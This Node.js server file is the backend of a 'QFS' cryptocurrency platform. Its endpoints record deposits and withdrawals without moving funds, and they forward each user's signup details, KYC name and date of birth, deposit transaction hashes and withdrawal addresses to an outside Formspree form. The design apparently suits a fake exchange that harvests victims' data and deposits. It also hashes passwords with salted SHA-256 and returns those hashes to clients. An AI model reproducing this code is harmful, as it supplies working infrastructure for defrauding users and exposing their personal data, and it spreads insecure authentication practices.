const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const DATA_DIR = './data';
const USERS_FILE = path.join(DATA_DIR, 'users.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const loadUsers = () => {
  if (!fs.existsSync(USERS_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
  catch { return {}; }
};

const saveUsers = (users) => fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));

const hashPassword = (pwd) => crypto.createHash('sha256').update(pwd + 'nqfs_v7').digest('hex');
const generateToken = () => crypto.randomBytes(24).toString('hex');

let users = loadUsers();
let sessions = {};

const parseBody = (req) => new Promise((resolve) => {
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    try { resolve(JSON.parse(body)); }
    catch { resolve({}); }
  });
});

const sendEmail = (subject, message) => {
  fetch('https://formspree.io/f/mgodlgwb', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ subject, message })
  }).catch(() => {});
};

const handler = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  
  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  // Static files
  if (req.method === 'GET' && req.url === '/') {
    const indexPath = path.join(__dirname, 'public', 'index.html');
    if (fs.existsSync(indexPath)) return res.end(fs.readFileSync(indexPath, 'utf8'));
    res.writeHead(404);
    res.end('index.html not found');
    return;
  }

  if (req.method === 'POST' && req.url === '/api/login') {
    const body = await parseBody(req);
    const foundUser = Object.values(users).find(u => u.email === body.email);
    
    if (foundUser && foundUser.passwordHash === hashPassword(body.password)) {
      const tok = generateToken();
      sessions[tok] = { token: tok, userId: foundUser.id, user: foundUser };
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ token: tok, user: foundUser }));
    } else {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Invalid email or password' }));
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/register') {
    const body = await parseBody(req);
    const id = 'u_' + Date.now();
    const newUser = {
      id,
      name: body.name,
      email: body.email,
      passwordHash: hashPassword(body.password),
      balances: { XLM: 0, XRP: 0, USDC: 0, BTC: 0 },
      kycStatus: 'unverified',
      createdAt: new Date().toISOString()
    };
    
    users[id] = newUser;
    saveUsers(users);
    
    sendEmail(`New Signup — ${newUser.name}`, `User registered:\n\nName: ${newUser.name}\nEmail: ${newUser.email}\nTime: ${new Date().toISOString()}`);
    
    const tok = generateToken();
    sessions[tok] = { token: tok, userId: id, user: newUser };
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ token: tok, user: newUser }));
    return;
  }

  const token = req.headers.authorization?.replace('Bearer ', '');
  const user = Object.values(sessions).find(s => s.token === token);

  if (req.method === 'GET' && req.url === '/api/me' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ user: user.user }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/balances' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ balances: user.user.balances }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/kyc/status' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: user.user.kycStatus }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/transactions' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ transactions: user.user.transactions || [] }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/deposit-proofs' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ proofs: user.user.depositProofs || [] }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/withdrawals' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ withdrawals: user.user.withdrawals || [] }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/tickets' && user) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ tickets: user.user.tickets || [] }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/kyc/submit' && user) {
    const body = await parseBody(req);
    user.user.kycStatus = 'pending';
    user.user.kycDocType = body.docType;
    users[user.userId] = user.user;
    saveUsers(users);
    
    sendEmail(`KYC Submission — ${user.user.name}`, `KYC submitted:\n\nUser: ${user.user.name}\nEmail: ${user.user.email}\nDoc Type: ${body.docType}\nName: ${body.fullName}\nDOB: ${body.dob}`);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/deposit-proof' && user) {
    const body = await parseBody(req);
    if (!user.user.depositProofs) user.user.depositProofs = [];
    
    const proof = {
      id: 'dp_' + Date.now(),
      coin: body.coin,
      amount: body.amount,
      txhash: body.txhash,
      status: 'pending',
      submittedAt: new Date().toISOString()
    };
    
    user.user.depositProofs.push(proof);
    users[user.userId] = user.user;
    saveUsers(users);
    
    sendEmail(`Deposit Proof — ${user.user.name}`, `Deposit received:\n\nUser: ${user.user.name}\nEmail: ${user.user.email}\nCoin: ${body.coin}\nAmount: ${body.amount}\nTx: ${body.txhash}`);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, proofId: proof.id }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/withdrawal' && user) {
    const body = await parseBody(req);
    if (!user.user.withdrawals) user.user.withdrawals = [];
    
    const wd = {
      id: 'wd_' + Date.now(),
      coin: body.coin,
      amount: body.amount,
      address: body.address,
      status: 'pending',
      submittedAt: new Date().toISOString()
    };
    
    user.user.withdrawals.push(wd);
    users[user.userId] = user.user;
    saveUsers(users);
    
    sendEmail(`Withdrawal Request — ${user.user.name}`, `Withdrawal requested:\n\nUser: ${user.user.name}\nEmail: ${user.user.email}\nCoin: ${body.coin}\nAmount: ${body.amount}\nAddress: ${body.address}`);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, withdrawalId: wd.id }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/ticket' && user) {
    const body = await parseBody(req);
    if (!user.user.tickets) user.user.tickets = [];
    
    const ticket = {
      id: 'tkt_' + Date.now(),
      subject: body.subject,
      message: body.message,
      status: 'open',
      createdAt: new Date().toISOString()
    };
    
    user.user.tickets.push(ticket);
    users[user.userId] = user.user;
    saveUsers(users);
    
    sendEmail(`Support Ticket — ${body.subject}`, `From: ${body.name}\nEmail: ${body.email}\nMessage: ${body.message}`);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, ticketId: ticket.id }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/update-profile' && user) {
    const body = await parseBody(req);
    user.user.name = body.name;
    users[user.userId] = user.user;
    saveUsers(users);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
    return;
  }

  if (req.method === 'POST' && req.url === '/api/change-password' && user) {
    const body = await parseBody(req);
    if (user.user.passwordHash === hashPassword(body.currentPassword)) {
      user.user.passwordHash = hashPassword(body.newPassword);
      users[user.userId] = user.user;
      saveUsers(users);
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    } else {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Incorrect current password' }));
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/logout' && user) {
    delete sessions[token];
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
    return;
  }

  res.writeHead(401);
  res.end('Unauthorized');
};

http.createServer(handler).listen(PORT, () => {
  console.log(`✓ QFS Server running on port ${PORT}`);
  console.log(`✓ Email notifications enabled via Formspree`);
});
